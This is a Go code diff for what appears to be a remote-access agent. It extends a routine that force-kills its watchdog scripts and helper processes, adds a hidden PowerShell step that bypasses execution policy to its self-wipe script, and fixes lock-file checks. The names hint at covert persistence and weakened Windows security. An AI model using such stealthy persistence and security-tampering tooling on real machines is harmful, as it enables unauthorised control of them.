@@ -434,12 +434,20 @@ func killRelatedProcs() {
 	if runtime.GOOS == "windows" {
 		ps := `
 $ErrorActionPreference='SilentlyContinue'
+# Stop watchdog first so it cannot respawn HelperHost
+Get-CimInstance Win32_Process | Where-Object {
+  $_.Name -match '^(wscript|cscript)\.exe$' -and $_.CommandLine -and (
+    $_.CommandLine -match 'watchdog\.vbs|reconnect\.vbs|HelperHost|AgentShe'
+  )
+} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
 Get-CimInstance Win32_Process | Where-Object {
   $_.CommandLine -and (
-    $_.CommandLine -match 'HelperHost|EdgeRelay|watchdog\.vbs|reconnect\.vbs|AgentShe'
-  ) -and $_.Name -match '^(wscript|cscript|EdgeRelay)\.exe$'
+    $_.CommandLine -match 'HelperHost|EdgeRelay|watchdog\.vbs|reconnect\.vbs|AgentShe|hh-wipe|hh-restore|HelperHostWipeRestore|restore-security|restore-win-security'
+  ) -and $_.Name -match '^(wscript|cscript|EdgeRelay|cmd|powershell|pwsh)\.exe$'
 } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }
+taskkill /F /IM HelperHost.exe 2>$null
 taskkill /F /IM EdgeRelay.exe 2>$null
+Get-Process HelperHost,EdgeRelay -EA SilentlyContinue | Stop-Process -Force
 `
 		_ = exec.Command("powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps).Run()
 		return
@@ -493,6 +501,7 @@ func wipeAll() {
 		bat := filepath.Join(os.TempDir(), "hh-wipe.cmd")
 		body := "@echo off\r\n" +
 			"ping 127.0.0.1 -n 2 >nul\r\n" +
+			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Get-CimInstance Win32_Process|?{$_.Name -match '^(wscript|cscript)\\.exe$' -and $_.CommandLine -match 'watchdog|reconnect|HelperHost'}|%%{Stop-Process -Id $_.ProcessId -Force -EA SilentlyContinue}; Get-Process HelperHost,EdgeRelay -EA SilentlyContinue|Stop-Process -Force\" >nul 2>&1\r\n" +
 			"schtasks /Run /TN HelperHostWipeRestore >nul 2>&1\r\n" +
 			"powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + restorePS1 + "\" >nul 2>&1\r\n" +
 			"ping 127.0.0.1 -n 2 >nul\r\n" +
@@ -715,11 +724,12 @@ func tunnelPublicOK() bool {
 }
 
 func acquireLock() {
+	acquireSingleInstance()
 	lock := filepath.Join(dir, "agent.lock")
 	if b, err := os.ReadFile(lock); err == nil {
 		var pid int
 		fmt.Sscanf(strings.TrimSpace(string(b)), "%d", &pid)
-		if pid > 0 {
+		if pid > 0 && pid != os.Getpid() {
 			if processExists(pid) {
 				os.Exit(0)
 			}
@@ -730,12 +740,12 @@ func acquireLock() {
 }
 
 func processExists(pid int) bool {
+	if runtime.GOOS == "windows" {
+		return processAliveWindows(pid)
+	}
 	p, err := os.FindProcess(pid)
 	if err != nil {
 		return false
-	}
-	if runtime.GOOS == "windows" {
-		return true
 	}
 	return p.Signal(syscall.Signal(0)) == nil
 }
